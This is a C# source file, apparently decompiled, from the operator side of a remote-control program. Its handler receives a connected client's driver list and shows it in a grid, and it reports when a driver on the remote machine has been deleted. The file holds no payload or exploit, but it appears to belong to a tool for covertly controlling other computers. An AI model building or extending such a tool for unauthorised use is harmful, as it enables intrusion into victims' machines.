using System;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Leb128;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerDriverManager
{
	public static void Read(Clients client, object[] objects)
	{
		if (objects.Length < 2)
		{
			return;
		}
		switch ((string)objects[1])
		{
		case "Ready":
		{
			FormDriverManager form3 = null;
			string hwid = null;
			if (!string.IsNullOrEmpty(client.Hwid))
			{
				form3 = (FormDriverManager)Application.OpenForms["DriverManager:" + client.Hwid];
				if (form3 != null)
				{
					hwid = client.Hwid;
				}
			}
			if (form3 == null)
			{
				foreach (Form openForm in Application.OpenForms)
				{
					if (!(openForm is FormDriverManager driverForm) || !openForm.Name.StartsWith("DriverManager:"))
					{
						continue;
					}
					string formHwid = openForm.Name.Substring(14);
					if (objects.Length >= 3 && objects[2] is string receivedHwid && string.Equals(formHwid, receivedHwid, StringComparison.OrdinalIgnoreCase))
					{
						form3 = driverForm;
						hwid = formHwid;
						if (!string.IsNullOrEmpty(hwid) && string.IsNullOrEmpty(client.Hwid))
						{
							client.Hwid = hwid;
						}
						break;
					}
				}
			}
			if (form3 == null)
			{
				break;
			}
			if (string.IsNullOrEmpty(client.Hwid) && !string.IsNullOrEmpty(hwid))
			{
				client.Hwid = hwid;
			}
			form3.Invoke((MethodInvoker)delegate
			{
				form3.client = client;
				if (!string.IsNullOrEmpty(hwid))
				{
					form3.Text = "Driver Manager [" + hwid + "]";
				}
				form3.materialLabel1.Enabled = true;
				form3.dataGridViewDrivers.Enabled = true;
				form3.materialLabel1.Text = "Success Connect";
			});
			client.Tag = form3;
			Task.Run(delegate
			{
				Thread.Sleep(500);
				if (client.Tag != null && client.itsConnect)
				{
					client.Send(LEB128.Write(new object[1] { "Refresh" }));
				}
			});
			break;
		}
		case "Error":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormDriverManager form2 = (FormDriverManager)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.materialLabel1.Text = "Error: " + (string)objects[2];
			});
			break;
		}
		case "ListDrivers":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormDriverManager form4 = (FormDriverManager)client.Tag;
			form4.Invoke((MethodInvoker)delegate
			{
				form4.dataGridViewDrivers.Rows.Clear();
				form4.materialLabel1.Text = "Success list drivers";
				int num = 2;
				while (num < objects.Length)
				{
					DataGridViewRow dataGridViewRow = new DataGridViewRow
					{
						Cells = 
						{
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							}
						}
					};
					form4.dataGridViewDrivers.Rows.Add(dataGridViewRow);
				}
			});
			break;
		}
		case "DeleteSuccess":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormDriverManager form = (FormDriverManager)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.materialLabel1.Text = "Driver deleted: " + (string)objects[2];
			});
			Task.Run(delegate
			{
				if (client.Tag != null)
				{
					FormDriverManager formDriverManager = (FormDriverManager)client.Tag;
					if (formDriverManager.client != null)
					{
						formDriverManager.client.Send(LEB128.Write(new object[1] { "Refresh" }));
					}
				}
			});
			break;
		}
		}
	}
}
